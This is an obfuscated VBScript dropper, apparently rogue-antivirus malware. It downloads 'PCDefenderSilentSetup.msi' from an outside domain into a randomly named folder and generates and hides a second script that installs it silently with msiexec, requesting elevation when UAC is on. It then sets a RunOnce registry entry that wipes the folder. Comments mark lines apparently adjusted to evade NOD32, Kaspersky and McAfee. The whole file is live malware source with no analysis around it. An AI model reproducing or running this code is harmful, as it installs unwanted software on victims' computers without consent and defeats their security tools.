Dim Yyrh9qGvA84E6n, wK2EPSP21q2D2ka
wi8y38MtjLT98pFYZd = "" & keBDLFNPyiEm3J4PjBWZz & "\" & uSKK4e378B05hY1EKG ' <- NOD32
Set Yyrh9qGvA84E6n = CreateObject("Scripting.FileSystemObject")
Set wK2EPSP21q2D2ka = Yyrh9qGvA84E6n.CreateFolder(wi8y38MtjLT98pFYZd)

bqZ6m3qgFaxiO = "http://newkaksosat.info/PCDefenderSilentSetup.msi"
E3TCSa = "" & uSKK4e378B05hY1EKG & ".msi"
pz51z4hOH5jP7hglU68xAG bqZ6m3qgFaxiO, wi8y38MtjLT98pFYZd, E3TCSa ' <- KIS

xr78En70vA = "Dim qDEx327e32DbLaagydrr, P614KSRkqCJ, eZaYKA7, VdZYu4oq2O6R9hSQW8, CeBA5iLBG1Am77, n5nQDw31IXLP" & vbCr & vbLf & _
    "Set qDEx327e32DbLaagydrr = CreateObject(""WScript.Shell"")" & vbCr & vbLf & _
    "P614KSRkqCJ = qDEx327e32DbLaagydrr.ExpandEnvironmentStrings(""%OS%"")" & vbCr & vbLf & _
    "If P614KSRkqCJ = ""Windows_NT"" Then" & vbCr & vbLf & _
    "   eZaYKA7 = ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\""" & vbCr & vbLf & _
    "   VdZYu4oq2O6R9hSQW8 = qDEx327e32DbLaagydrr.regread(eZaYKA7 & ""CurrentVersion"")" & vbCr & vbLf & _
    "Else" & vbCr & vbLf & _
    "  eZaYKA7 = ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\""" & vbCr & vbLf & _
    "  VdZYu4oq2O6R9hSQW8 = qDEx327e32DbLaagydrr.regread(eZaYKA7 & ""VersionNumber"")" & vbCr & vbLf & _
    "End if" & vbCr & vbLf & _
    "VdZYu4oq2O6R9hSQW8 = Mid(VdZYu4oq2O6R9hSQW8,1,1)" & vbCr & vbLf & _
    "If (VdZYu4oq2O6R9hSQW8 = 6) Then" & vbCr & vbLf & _
    "   CeBA5iLBG1Am77 = ""HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\""" & vbCr & vbLf & _
    "   n5nQDw31IXLP = qDEx327e32DbLaagydrr.regread(CeBA5iLBG1Am77 & ""EnableLUA"")" & vbCr & vbLf & _
    "End If" & vbCr & vbLf & _
    "Set qDEx327e32DbLaagydrr = Nothing" & vbCr & vbLf & _
    "Set qDEx327e32DbLaagydrr = CreateObject(""Shell.Application"")" & vbCr & vbLf & _
	"If ((VdZYu4oq2O6R9hSQW8 = 6) AND (n5nQDw31IXLP = 1)) Then" & vbCr & vbLf & _
	"   qDEx327e32DbLaagydrr.ShellExecute ""msiexec"", "" /i "" & Chr(34) & """&E3TCSa&""" & Chr(34) & "" /quiet"", """", ""runas"", 1" & vbCr & vbLf & _
    "   Set qDEx327e32DbLaagydrr = Nothing" & vbCr & vbLf & _
    "Else" & vbCr & vbLf & _
	"   qDEx327e32DbLaagydrr.ShellExecute ""msiexec"", "" /i "" & Chr(34) & """&E3TCSa&""" & Chr(34) & "" /quiet"", """", ""open"", 1" & vbCr & vbLf & _
    "   Set qDEx327e32DbLaagydrr = Nothing" & vbCr & vbLf & _
    "End If"
s3Uq6d5IC = wi8y38MtjLT98pFYZd & "\" & uSKK4e378B05hY1EKG & ".vbs"
Set vNGOM034NeAa9 = Yyrh9qGvA84E6n.OpenTextFile(s3Uq6d5IC, 8, True)
vNGOM034NeAa9.WriteLine(xr78En70vA)
vNGOM034NeAa9.Close

dim r3ep6X5CYJCP7DK
set r3ep6X5CYJCP7DK = CreateObject("Shell.Application")
r3ep6X5CYJCP7DK.ShellExecute "wscript", """" & s3Uq6d5IC & """", "", "open", 0 ' <- McAfee
set r3ep6X5CYJCP7DK = nothing

FHmF754C wi8y38MtjLT98pFYZd


Function pz51z4hOH5jP7hglU68xAG(Rx0swo246qaFzxH78GjsJ35Y, h3W1C6rB3ggG0, kQdQhGF0e3Cd)
   Dim vk3DE52, GOlOxIUJb8BXOKMYvReH99jZ
   
   Rx0swo246qaFzxH78GjsJ35Y = Replace(Rx0swo246qaFzxH78GjsJ35Y,"\","/")

   'If len(kQdQhGF0e3Cd) = 0 Then ' <- KIS
   '   Exit Function 
   'End If

   Set vk3DE52 = CREATEOBJECT("Microsoft.XMLHTTP") 
   vk3DE52.open "GET", Rx0swo246qaFzxH78GjsJ35Y, "False" 

   vk3DE52.send 
   If vk3DE52.statustext = "OK" Then 
      Set GOlOxIUJb8BXOKMYvReH99jZ = CreateObject("ADODB.Stream") 
      GOlOxIUJb8BXOKMYvReH99jZ.type = 1 
      GOlOxIUJb8BXOKMYvReH99jZ.Open 
      GOlOxIUJb8BXOKMYvReH99jZ.Write vk3DE52.responseBody 

      if len(h3W1C6rB3ggG0) > 0 Then kQdQhGF0e3Cd = h3W1C6rB3ggG0 & "\" & kQdQhGF0e3Cd 
      GOlOxIUJb8BXOKMYvReH99jZ.SaveToFile kQdQhGF0e3Cd, 2 
      GOlOxIUJb8BXOKMYvReH99jZ.Close 
      Set GOlOxIUJb8BXOKMYvReH99jZ = Nothing 
      pz51z4hOH5jP7hglU68xAG = 1
   End if 
   Set vk3DE52 = Nothing
End Function


Function uSKK4e378B05hY1EKG
	T3E593Bwl1bV2sB78 = 14
	s2ZDa228wi4OORYHDFMAs = 7

	Randomize  
	kV62M7M9Fh6I2mie9 = Int(((T3E593Bwl1bV2sB78 - s2ZDa228wi4OORYHDFMAs + 1) * Rnd) _
	    + T3E593Bwl1bV2sB78)  

	T3E593Bwl1bV2sB78 = 90
	s2ZDa228wi4OORYHDFMAs = 65
	
	For i = 1 to kV62M7M9Fh6I2mie9
	    Randomize
	    Aq566g6CeawaE4Xv851 = Int(((T3E593Bwl1bV2sB78 - s2ZDa228wi4OORYHDFMAs + 1) * Rnd) _
	        + s2ZDa228wi4OORYHDFMAs)  
	    gTC361bI9QCBt69QQ8SzQX1 = gTC361bI9QCBt69QQ8SzQX1 & Chr(Aq566g6CeawaE4Xv851)
	Next
	
	uSKK4e378B05hY1EKG = gTC361bI9QCBt69QQ8SzQX1
End Function


Function keBDLFNPyiEm3J4PjBWZz
	Set v3JWYuo001U = Wscript.CreateObject("Wscript.Shell")
	keBDLFNPyiEm3J4PjBWZz = v3JWYuo001U.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Personal")
End Function


Function FHmF754C(xegkdP3D3STsFGL2Fc5OI)
	Set OxeY68wAJv04b40 = Wscript.CreateObject("Wscript.Shell")
	OxeY68wAJv04b40.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\delpcdefmsi", "cmd /c rmdir /s /q """ & xegkdP3D3STsFGL2Fc5OI & """", "REG_SZ"
End Function
